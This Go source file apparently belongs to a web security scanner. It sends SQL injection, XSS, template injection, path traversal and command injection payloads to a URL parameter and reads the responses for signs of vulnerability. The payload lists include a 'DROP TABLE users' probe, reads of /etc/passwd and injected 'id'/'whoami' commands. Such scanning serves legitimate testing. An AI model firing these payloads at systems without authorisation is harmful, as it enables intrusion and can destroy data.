package core

import (
	"fmt"
	"net/url"
	"strings"
	"time"
)

// InjectionPayloads contains payloads for each injection type.
var InjectionPayloads = map[InjectionType][]string{
	InjectionSQLi: {
		"'",
		"''",
		"' OR '1'='1",
		"' OR 1=1--",
		"'; DROP TABLE users--",
		"1' AND SLEEP(5)--",
		"' UNION SELECT NULL--",
		"admin'--",
		"' OR 'x'='x",
		"1; WAITFOR DELAY '0:0:5'--",
	},
	InjectionXSS: {
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		`"><script>alert(1)</script>`,
		"javascript:alert(1)",
		"<svg onload=alert(1)>",
		`'"><img src=x onerror=alert(1)>`,
		"<body onload=alert(1)>",
	},
	InjectionSSTI: {
		"{{7*7}}",
		"${7*7}",
		"<%= 7*7 %>",
		"#{7*7}",
		"{{config}}",
		"${T(java.lang.Runtime).getRuntime().exec('id')}",
		"{{''.__class__.__mro__}}",
	},
	InjectionPathTraversal: {
		"../../../etc/passwd",
		"../../../../windows/win.ini",
		"..%2F..%2F..%2Fetc%2Fpasswd",
		"%2e%2e%2fetc%2fpasswd",
		"....//....//etc/passwd",
		"/etc/passwd",
		`C:\Windows\win.ini`,
	},
	InjectionCmdInjection: {
		"; id",
		"| id",
		"&& id",
		"`id`",
		"$(id)",
		"; ls -la",
		"| dir",
		"& whoami",
		"; cat /etc/passwd",
	},
}

// sqliSignatures are error strings that indicate SQLi vulnerabilities.
var sqliSignatures = []string{
	"sql syntax",
	"mysql_fetch",
	"ORA-",
	"PostgreSQL",
	"syntax error",
	"unclosed quotation",
	"SQLSTATE",
	"Microsoft OLE DB",
	"sqlite_",
	"You have an error in your SQL syntax",
	"Warning: mysql",
	"MySQLSyntaxErrorException",
	"valid MySQL result",
	"check the manual that corresponds to your MySQL",
	"pg_query",
	"PSQLException",
}

// pathTraversalSignatures are strings that indicate path traversal success.
var pathTraversalSignatures = []string{
	"root:x:",
	"[boot loader]",
	"win.ini",
	"[fonts]",
	"[extensions]",
}

// RunInjectionTest sends HTTP requests with payloads injected into a parameter
// and analyzes responses for injection vulnerability indicators.
func RunInjectionTest(targetURL, parameter string, injType InjectionType) []InjectionResult {
	client := NewHTTPClient()
	payloads := InjectionPayloads[injType]

	var results []InjectionResult

	for _, payload := range payloads {
		result := testPayload(client, targetURL, parameter, payload, injType)
		results = append(results, result)
	}

	return results
}

func testPayload(client *HTTPClient, targetURL, parameter, payload string, injType InjectionType) InjectionResult {
	result := InjectionResult{
		Payload:   payload,
		Type:      injType,
		Parameter: parameter,
	}

	// Build URL with injected parameter
	injectedURL := buildInjectedURL(targetURL, parameter, payload)

	req := Request{
		Method: "GET",
		URL:    injectedURL,
	}

	start := time.Now()
	resp := client.Execute(req)
	elapsed := time.Since(start)

	result.Duration = elapsed

	if resp.Error != nil {
		result.StatusCode = 0
		result.Evidence = fmt.Sprintf("Request error: %v", resp.Error)
		return result
	}

	result.StatusCode = resp.StatusCode
	bodyLower := strings.ToLower(resp.Body)

	switch injType {
	case InjectionSQLi:
		result = detectSQLi(result, resp.Body, bodyLower, elapsed, payload)
	case InjectionXSS:
		result = detectXSS(result, resp.Body, payload)
	case InjectionSSTI:
		result = detectSSTI(result, resp.Body, payload)
	case InjectionPathTraversal:
		result = detectPathTraversal(result, resp.Body)
	case InjectionCmdInjection:
		result = detectCmdInjection(result, resp.Body, bodyLower)
	}

	return result
}

func buildInjectedURL(baseURL, parameter, payload string) string {
	parsed, err := url.Parse(baseURL)
	if err != nil {
		return baseURL + "?" + parameter + "=" + url.QueryEscape(payload)
	}

	q := parsed.Query()
	q.Set(parameter, payload)
	parsed.RawQuery = q.Encode()
	return parsed.String()
}

func detectSQLi(result InjectionResult, body, bodyLower string, elapsed time.Duration, payload string) InjectionResult {
	// Check for error-based SQLi
	for _, sig := range sqliSignatures {
		if strings.Contains(bodyLower, strings.ToLower(sig)) {
			result.Vulnerable = true
			result.Evidence = fmt.Sprintf("SQL error signature found: %q", sig)
			result.Confidence = "HIGH"
			return result
		}
	}

	// Check for time-based SQLi (SLEEP payloads)
	if strings.Contains(strings.ToLower(payload), "sleep") || strings.Contains(strings.ToLower(payload), "waitfor") {
		if elapsed > 4*time.Second {
			result.Vulnerable = true
			result.Evidence = fmt.Sprintf("Time-based SQLi: response took %v (>4s)", elapsed.Round(time.Millisecond))
			result.Confidence = "MEDIUM"
			return result
		}
	}

	// Check for generic SQL keywords in response that shouldn't be there
	_ = body
	result.Confidence = "LOW"
	return result
}

func detectXSS(result InjectionResult, body, payload string) InjectionResult {
	// Check if payload is reflected in response body
	if strings.Contains(body, payload) {
		result.Vulnerable = true
		result.Evidence = "Payload reflected in response body"
		result.Confidence = "HIGH"
		return result
	}

	// Check partial reflection (encoded)
	payloadCore := extractXSSCore(payload)
	if payloadCore != "" && strings.Contains(strings.ToLower(body), strings.ToLower(payloadCore)) {
		result.Vulnerable = true
		result.Evidence = fmt.Sprintf("Partial payload reflected: %q", payloadCore)
		result.Confidence = "MEDIUM"
		return result
	}

	result.Confidence = "LOW"
	return result
}

func extractXSSCore(payload string) string {
	// Extract the script/event handler core from XSS payload
	if strings.Contains(payload, "alert") {
		return "alert"
	}
	if strings.Contains(payload, "onerror") {
		return "onerror"
	}
	if strings.Contains(payload, "onload") {
		return "onload"
	}
	if strings.Contains(payload, "<script") {
		return "<script"
	}
	return ""
}

func detectSSTI(result InjectionResult, body, payload string) InjectionResult {
	// Check for math result from SSTI ({{7*7}} -> 49)
	sstResults := map[string]string{
		"{{7*7}}":  "49",
		"${7*7}":   "49",
		"<%= 7*7 %>": "49",
		"#{7*7}":   "49",
	}

	if expected, ok := sstResults[payload]; ok {
		if strings.Contains(body, expected) {
			result.Vulnerable = true
			result.Evidence = fmt.Sprintf("SSTI detected: expression %q evaluated to %q in response", payload, expected)
			result.Confidence = "HIGH"
			return result
		}
	}

	// Check for config/class leakage from SSTI
	if payload == "{{config}}" {
		if strings.Contains(strings.ToLower(body), "secret") || strings.Contains(strings.ToLower(body), "config") {
			result.Vulnerable = true
			result.Evidence = "Possible config/secret leaked via SSTI"
			result.Confidence = "MEDIUM"
			return result
		}
	}

	result.Confidence = "LOW"
	return result
}

func detectPathTraversal(result InjectionResult, body string) InjectionResult {
	for _, sig := range pathTraversalSignatures {
		if strings.Contains(body, sig) {
			result.Vulnerable = true
			result.Evidence = fmt.Sprintf("Path traversal evidence found: %q", sig)
			result.Confidence = "HIGH"
			return result
		}
	}
	result.Confidence = "LOW"
	return result
}

func detectCmdInjection(result InjectionResult, body, bodyLower string) InjectionResult {
	// Look for common command output signatures
	cmdSignatures := []string{
		"uid=",
		"gid=",
		"root:",
		"bin/bash",
		"bin/sh",
		"/etc/passwd",
		"Windows IP Configuration",
		"Volume in drive",
		"Directory of",
	}

	for _, sig := range cmdSignatures {
		if strings.Contains(body, sig) || strings.Contains(bodyLower, strings.ToLower(sig)) {
			result.Vulnerable = true
			result.Evidence = fmt.Sprintf("Command output signature: %q", sig)
			result.Confidence = "HIGH"
			return result
		}
	}

	result.Confidence = "LOW"
	return result
}
